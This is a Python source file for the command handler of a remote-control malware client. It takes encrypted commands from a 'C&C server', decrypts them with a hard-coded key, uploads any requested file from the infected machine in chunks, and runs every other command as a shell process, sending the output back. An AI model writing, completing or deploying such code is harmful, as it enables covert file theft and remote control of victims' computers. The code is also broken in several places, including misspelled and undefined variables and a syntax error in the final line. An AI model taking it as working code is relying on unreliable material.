# system imports
from subprocess import Popen, PIPE
import mimetypes

# internal imports
from bundler.request import Request
from utils.request_type import RequestType
from utils.data_request_type import DataRequestType
from utils.consts import DATA_CHUNK_SIZE
from utils.decrypt import decrypt

class Command:
    """ A class for handling the command sent by the C&C server. """

    def __init__(self, encrypted_command):
        self.cmd = encrypted_command
    
    def execute(self):
        """ Executes the command based on the type of command. """
        decrypted = decrypt(self.cmd, "secret")
        print("decrypted: " + decrypted)
        
        if decrypted.startswith("get:"):
            file_path = decrypted[decryped.index(":") + 1:]
            file_name = file_path[len(file_path) - file_path[::-1].index('/'):]

            mimetype = mimetypes.guess_type(file_path).type

            # send HEAD request
            head = Request(RequestType.DATA)
            request.send(options={
                "_type": DataRequestType.HEAD.value,
                "packet_number": 0,
                "filename": filename,
                "data": 1 if mimetype != None and mimetype.starts_with("text/") else 0, 
            })

            # send NORMAL requests
            packet_number = 1
            with open(file_path, 'rb') as fd:
                while True:
                    chunk = fd.read(DATA_CHUNK_SIZE)
                    if not chunk:
                        break
                    
                    normal = Request(RequestType.DATA)
                    request.send(options={
                        "_type": DataRequestType.NORMAL.value,
                        "packet_number": packet_number,
                        "file_path": file_path,
                        "data": chunk, 
                    })

                    packet_number += 1
                
            # send TAIL request
            tail = Request(RequestType.DATA)
            request.send(options={
                "_type": DataRequestType.TAIL.value,
                "packet_number": packet_number, # by now, packet_number = number of normal packets + 1
                "file_path": file_path,
                "data": "" # value does not matter for tail
            })
        else:
            process = Popen(decrypted.split(), stdout=PIPE, stderr=PIPE)
            stdout, stderr = process.communicate()

            request = Request(RequestType.RECEIPT)
            request.send(options={"cmd": decrypted, retcode": process.returncode, "output": stderr if process.returncode != 0 else stdout})